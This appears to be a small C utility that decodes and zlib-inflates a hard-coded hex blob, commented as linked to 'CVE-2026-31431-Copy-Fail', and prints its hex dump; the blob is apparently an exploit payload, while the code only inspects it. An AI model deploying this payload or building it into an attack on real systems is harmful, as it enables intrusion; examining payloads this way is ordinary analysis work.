#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <zlib.h>

/* see CVE-2026-31431-Copy-Fail */
static const char *hex_payload =
	"78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3";

/* @out: need to free() */
static size_t hex2bin(const char *hex, unsigned char **out)
{
	size_t len = strlen(hex);
	if (len % 2 != 0)
		return 0;
	size_t bin_len = len / 2;
	unsigned char *bin = malloc(bin_len);
	if (!bin)
		return 0;

	for (size_t i = 0; i < bin_len; i++) {
		sscanf(hex + 2 * i, "%02hhx", &bin[i]);
	}

	*out = bin;
	return bin_len;
}

int main(void)
{
	unsigned char *compressed = NULL;
	unsigned char *decompressed = NULL;
	size_t compressed_len = hex2bin(hex_payload, &compressed);

	if (!compressed_len) {
		fprintf(stderr, "Hex conversion failed\n");
		return 1;
	}
	printf("Compressed size: %zu bytes\n", compressed_len);

	uLongf decomp_len = 4096;
	decompressed = malloc(decomp_len);
	if (!decompressed) {
		free(compressed);
		return 1;
	}

	int ret = uncompress(decompressed, &decomp_len, compressed,
			     compressed_len);
	if (ret == Z_BUF_ERROR) {
		free(decompressed);
		decompressed = malloc(decomp_len);
		if (!decompressed) {
			free(compressed);
			return 1;
		}
		ret = uncompress(decompressed, &decomp_len, compressed,
				 compressed_len);
	}

	if (ret != Z_OK) {
		fprintf(stderr, "Decompress failed: %d\n", ret);
		free(compressed);
		free(decompressed);
		return 1;
	}

	printf("Decompressed size: %lu bytes\n", decomp_len);
	printf("Hex dump: ");
	for (uLongf i = 0; i < decomp_len; i++) {
		printf("%02x", decompressed[i]);
	}
	printf("\n");

	free(compressed);
	free(decompressed);
	return 0;
}
